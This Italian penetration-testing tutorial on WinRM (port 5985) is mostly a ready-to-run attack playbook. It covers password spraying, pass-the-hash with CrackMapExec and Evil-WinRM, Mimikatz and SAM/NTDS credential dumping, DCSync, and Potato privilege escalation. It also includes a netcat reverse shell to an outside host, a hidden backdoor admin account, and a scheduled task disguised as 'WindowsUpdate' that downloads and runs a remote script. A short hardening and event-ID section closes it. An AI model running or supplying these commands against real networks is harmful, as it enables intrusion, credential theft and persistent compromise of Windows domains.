---
title: 'Porta 5985 WinRM: Evil-WinRM, Pass-the-Hash e PowerShell Remoting'
slug: porta-5985-winrm
description: 'La porta 5985 espone WinRM su HTTP, il servizio Microsoft usato da PowerShell Remoting. Scopri enumerazione, accesso con Evil-WinRM, Pass-the-Hash, lateral movement e hardening in ambienti Active Directory.'
image: /porta-5985-winrm.webp
draft: true
date: 2026-03-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - evil-winrm
  - pass-the-hash
featured: true
---

WinRM (Windows Remote Management) è l'implementazione Microsoft del protocollo WS-Management per l'amministrazione remota. Ascolta sulla porta 5985 TCP (HTTP) e sulla [porta 5986](https://hackita.it/articoli/porta-5986-winrm-https) (HTTPS). Nel penetration testing di ambienti Active Directory, WinRM è spesso **la porta più importante dopo SMB**: permette l'esecuzione remota di comandi PowerShell, supporta Pass-the-Hash per autenticazione senza password in chiaro e, a differenza di [RDP](https://hackita.it/articoli/porta-3389-rdp), è una shell non interattiva che non disturba l'utente connesso al desktop — perfetta per operazioni stealth. Evil-WinRM, lo strumento più usato per accedere a WinRM, è diventato uno standard de facto nella metodologia OSCP e nei red team engagement.

WinRM è abilitato di default su Windows Server 2012+ e viene spesso attivato sui client tramite Group Policy. In un dominio Active Directory tipico, quasi tutte le macchine rispondono sulla 5985.

## Come Funziona WinRM

```
Attacker                           Target Windows (:5985)
┌──────────────┐                   ┌──────────────────────────┐
│ Evil-WinRM   │                   │ WinRM Service            │
│ CrackMapExec │── HTTP/SOAP ────►│  ├── PowerShell Remoting │
│ PowerShell   │                   │  ├── Esegui comandi      │
│              │ ◄── risultati ──  │  ├── Upload/Download     │
│              │                   │  └── Accesso filesystem   │
└──────────────┘                   └──────────────────────────┘
```

WinRM usa il protocollo SOAP su HTTP (porta 5985) o HTTPS (porta 5986). L'autenticazione supporta: Negotiate (NTLM/[Kerberos](https://hackita.it/articoli/kerberos)), Basic, Certificate e CredSSP. In un dominio AD, l'autenticazione è tipicamente [NTLM](https://hackita.it/articoli/ntlm) o Kerberos — e NTLM significa che **[Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) funziona**.

### Chi può connettersi via WinRM?

Per default, solo i membri di questi gruppi possono usare WinRM:

* **Administrators** (locale o dominio)
* **Remote Management Users**

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 5985,5986 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0
```

### Verifica WinRM attivo

```bash
# Test con curl
curl -s http://10.10.10.40:5985/wsman -I
```

```
HTTP/1.1 405 Method Not Allowed
Server: Microsoft-HTTPAPI/2.0
```

`405 Method Not Allowed` → WinRM è attivo (risponderebbe `404` se non installato).

### CrackMapExec

```bash
crackmapexec winrm 10.10.10.40
```

```
WINRM  10.10.10.40  5985  DC-01  [*] http://10.10.10.40:5985/wsman
```

Conferma WinRM attivo e rivela l'hostname (`DC-01`).

## 2. Credential Attack

### Password spray con [CrackMapExec](https://hackita.it/articoli/crackmapexec/) o [NetExec](https://hackita.it/articoli/netexec)

```bash
# Singolo utente
crackmapexec winrm 10.10.10.40 -u administrator -p 'Corp2025!'
```

```
WINRM  10.10.10.40  5985  DC-01  [+] CORP\administrator:Corp2025! (Pwn3d!)
```

`(Pwn3d!)` → credenziali valide E l'utente ha permesso WinRM.

```bash
# Password spray su più utenti
crackmapexec winrm 10.10.10.40 -u users.txt -p 'Corp2025!' --continue-on-success
```

```bash
# Con lista di password
crackmapexec winrm 10.10.10.40 -u users.txt -p passwords.txt --no-bruteforce
# --no-bruteforce: testa user1:pass1, user2:pass2 (non tutte le combinazioni)
```

### Pass-the-Hash (senza password in chiaro)

Se hai un hash NTLM (da [Mimikatz](https://hackita.it/articoli/mimikatz), [DCSync](https://hackita.it/articoli/dcsync), dump SAM o [responder](https://hackita.it/articoli/responder)):

```bash
crackmapexec winrm 10.10.10.40 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
```

```
WINRM  10.10.10.40  5985  DC-01  [+] CORP\administrator:32ed87bdb5fdc5e9cba88547376818d4 (Pwn3d!)
```

**Pass-the-Hash funziona su WinRM** — non serve crackare l'hash. Questo è il motivo per cui WinRM è così critico: un singolo hash NTLM dà accesso a tutte le macchine dove quell'utente è admin.

### Spray su tutta la subnet

```bash
crackmapexec winrm 10.10.10.0/24 -u administrator -H 'HASH' --continue-on-success
```

```
WINRM  10.10.10.40  5985  DC-01     [+] CORP\administrator (Pwn3d!)
WINRM  10.10.10.41  5985  WEB-01    [+] CORP\administrator (Pwn3d!)
WINRM  10.10.10.42  5985  DB-01     [+] CORP\administrator (Pwn3d!)
WINRM  10.10.10.43  5985  FILE-01   [-] CORP\administrator ACCESS_DENIED
```

Tre macchine compromesse con un singolo hash.

## 3. Evil-WinRM — Shell Interattiva

[Evil-WinRM ](https://hackita.it/articoli/evil-winrm)è lo strumento standard per ottenere una shell PowerShell via WinRM.

### Connessione con password

```bash
evil-winrm -i 10.10.10.40 -u administrator -p 'Corp2025!'
```

```
Evil-WinRM shell v3.5
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Connessione con hash (Pass-the-Hash)

```bash
evil-winrm -i 10.10.10.40 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

### Connessione con Kerberos ticket

```bash
export KRB5CCNAME=/tmp/administrator.ccache
evil-winrm -i DC-01.corp.local -r corp.local
```

### Feature di Evil-WinRM

```powershell
# Upload file
*Evil-WinRM* PS> upload /opt/tools/mimikatz.exe C:\Windows\Temp\mimikatz.exe

# Download file
*Evil-WinRM* PS> download C:\Users\Administrator\Desktop\flag.txt /tmp/flag.txt

# Carica script PowerShell in memoria (fileless)
*Evil-WinRM* PS> menu
*Evil-WinRM* PS> Invoke-Binary /opt/tools/SharpHound.exe
```

```bash
# Evil-WinRM con directory di script PS1
evil-winrm -i 10.10.10.40 -u admin -p 'pass' -s /opt/ps_scripts/
```

```powershell
# Carica ed esegui script dalla directory
*Evil-WinRM* PS> PowerView.ps1
*Evil-WinRM* PS> Get-DomainUser -Identity admin
```

## 4. Post-Exploitation

### Enumerazione iniziale

```powershell
# Chi sono
whoami /all

# Hostname e dominio
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"

# Utenti locali
net user

# Gruppi di cui faccio parte
net user administrator

# Utenti del dominio
net user /domain

# Domain admins
net group "Domain Admins" /domain
```

### Mimikatz via Evil-WinRM

```powershell
# Upload Mimikatz
*Evil-WinRM* PS> upload /opt/tools/mimikatz.exe C:\Windows\Temp\m.exe

# Esegui
*Evil-WinRM* PS> C:\Windows\Temp\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

```
Authentication Id : 0 ; 12345678 (00000000:00bc614e)
Session           : Interactive from 1
User Name         : svc_backup
Domain            : CORP
NTLM              : 8846f7eaee8fb117ad06bdd830b7586c
```

Hash NTLM di `svc_backup` → testa su tutte le macchine via WinRM.

Per la guida completa: [Mimikatz](https://hackita.it/articoli/mimikatz) e [DCSync](https://hackita.it/articoli/dcsync).

### SAM dump (credenziali locali)

```powershell
# Salva i registry hive
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\system

# Download
*Evil-WinRM* PS> download C:\Windows\Temp\sam /tmp/sam
*Evil-WinRM* PS> download C:\Windows\Temp\system /tmp/system
```

```bash
# Estrai hash con secretsdump (da Kali)
impacket-secretsdump -sam sam -system system LOCAL
```

```
Administrator:500:aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1001:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

### DCSync (se sei Domain Admin)

```powershell
# Da Evil-WinRM con Mimikatz
C:\Windows\Temp\m.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"
```

Con l'hash di `krbtgt` → [Golden Ticket](https://hackita.it/articoli/active-directory) → accesso permanente al dominio.

### BloodHound collection

```powershell
# SharpHound (collector)
*Evil-WinRM* PS> upload /opt/tools/SharpHound.exe C:\Windows\Temp\sh.exe
*Evil-WinRM* PS> C:\Windows\Temp\sh.exe -c all --zipfilename data.zip
*Evil-WinRM* PS> download C:\Windows\Temp\*_data.zip /tmp/
```

Importa in BloodHound → visualizza i path di escalation verso Domain Admin.

## 5. Lateral Movement via WinRM

### Da macchina a macchina

```bash
# Dalla tua Kali → ogni macchina dove l'utente è admin
evil-winrm -i 10.10.10.41 -u svc_backup -H '8846f7eaee8fb117ad06bdd830b7586c'
```

### Dalla sessione Evil-WinRM verso un'altra macchina

```powershell
# PowerShell remoting nativo (da dentro la sessione)
$sess = New-PSSession -ComputerName WEB-01 -Credential (Get-Credential)
Invoke-Command -Session $sess -ScriptBlock { whoami; hostname }
```

### WinRM chain: Kali → DC → Server interno

```bash
# Se il server interno non è raggiungibile direttamente
# Usa il DC come pivot
evil-winrm -i DC-01 ...
```

```powershell
# Dal DC, connettiti al server interno
Enter-PSSession -ComputerName DB-INTERNAL-01 -Credential $cred
```

### Esecuzione comandi massiva

```bash
# CrackMapExec per eseguire un comando su TUTTE le macchine
crackmapexec winrm 10.10.10.0/24 -u admin -H HASH -x "whoami"
crackmapexec winrm 10.10.10.0/24 -u admin -H HASH -X "Get-Process" # PowerShell
```

## 6. Privilege Escalation

### Da utente WinRM a Administrator/SYSTEM

Se hai accesso WinRM come utente normale (membro di `Remote Management Users` ma non admin):

```powershell
# Verifica privilegi
whoami /priv

# Cerca privilege escalation
*Evil-WinRM* PS> upload /opt/tools/winPEAS.exe C:\Windows\Temp\wp.exe
*Evil-WinRM* PS> C:\Windows\Temp\wp.exe
```

### Token privilege comuni sfruttabili

```powershell
# SeImpersonatePrivilege → Potato attacks
whoami /priv | findstr "SeImpersonate"
```

Se presente `SeImpersonatePrivilege` (comune per service account):

```powershell
# Upload e esegui JuicyPotatoNG / GodPotato / PrintSpoofer
*Evil-WinRM* PS> upload /opt/tools/GodPotato.exe C:\Windows\Temp\gp.exe
*Evil-WinRM* PS> C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
# NT AUTHORITY\SYSTEM
```

```powershell
# PrintSpoofer (più semplice, Windows 10/Server 2019)
*Evil-WinRM* PS> upload /opt/tools/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
*Evil-WinRM* PS> C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe 10.10.10.200 4444 -e cmd"
```

### SeBackupPrivilege → Dump SAM/NTDS

```powershell
# Se hai SeBackupPrivilege (es: utente svc_backup)
# Puoi leggere qualsiasi file del sistema

# Dump NTDS.dit (database Active Directory)
*Evil-WinRM* PS> mkdir C:\Windows\Temp\backup
*Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Windows\Temp\backup\system
*Evil-WinRM* PS> upload /opt/tools/DiskShadow_script.txt

# DiskShadow per copiare NTDS.dit
```

## 7. Persistence

### Crea utente backdoor con accesso WinRM

```powershell
# Crea utente nascosto ($ nel nome lo nasconde da "net user")
net user backdoor$ B4ckD00r_2025! /add
net localgroup "Remote Management Users" backdoor$ /add
net localgroup "Administrators" backdoor$ /add
```

### Scheduled Task per reverse shell

```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.200/rev.ps1')" /sc hourly /ru SYSTEM
```

## 8. Detection & Hardening

* **Disabilita WinRM dove non necessario** — `Disable-PSRemoting -Force`
* **Usa solo HTTPS (5986)** — non HTTP in chiaro sulla 5985
* **Limita i gruppi** — solo gli utenti strettamente necessari in `Remote Management Users`
* **JEA (Just Enough Administration)** — limita i comandi PowerShell disponibili via WinRM
* **Firewall** — porta 5985/5986 solo da jump host di amministrazione
* **Monitora** Event ID 4624 (Type 3 e 10) per login WinRM, Event ID 4688 per processi creati
* **Credential Guard** — previene estrazione hash da LSASS
* **LAPS** — password locali uniche per ogni macchina
* **Audit PowerShell** — abilita Script Block Logging e Transcription

### Event ID chiave

| Event ID      | Log                     | Significato                              |
| ------------- | ----------------------- | ---------------------------------------- |
| 4624 (Type 3) | Security                | Login WinRM riuscito                     |
| 4625          | Security                | Login fallito (brute force)              |
| 91            | Microsoft-Windows-WinRM | Sessione WinRM creata                    |
| 4688          | Security                | Processo creato (comandi eseguiti)       |
| 4104          | PowerShell              | Script Block Logging (contenuto comandi) |

## 9. Cheat Sheet Finale

| Azione          | Comando                                                                   |
| --------------- | ------------------------------------------------------------------------- |
| Nmap            | `nmap -sV -p 5985,5986 target`                                            |
| CME check       | `crackmapexec winrm target`                                               |
| CME password    | `crackmapexec winrm target -u user -p pass`                               |
| CME PtH         | `crackmapexec winrm target -u user -H hash`                               |
| CME spray       | `crackmapexec winrm subnet -u users.txt -p 'Pass!' --continue-on-success` |
| Evil-WinRM pwd  | `evil-winrm -i target -u user -p pass`                                    |
| Evil-WinRM hash | `evil-winrm -i target -u user -H hash`                                    |
| Upload          | `upload local_file remote_path` (in Evil-WinRM)                           |
| Download        | `download remote_path local_path`                                         |
| Mimikatz        | `upload mimikatz.exe` → esegui                                            |
| SAM dump        | `reg save HKLM\SAM` + `reg save HKLM\SYSTEM`                              |
| DCSync          | `mimikatz "lsadump::dcsync /domain:X /user:krbtgt"`                       |
| Exec massiva    | `crackmapexec winrm subnet -u user -H hash -x "command"`                  |

***

Riferimento: Microsoft WinRM documentation, Evil-WinRM, HackTricks WinRM, OSCP methodology. Uso esclusivo in ambienti autorizzati. [https://www.pentestpad.com/port-exploit/port-59855986-winrm-windows-remote-management](https://www.pentestpad.com/port-exploit/port-59855986-winrm-windows-remote-management)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
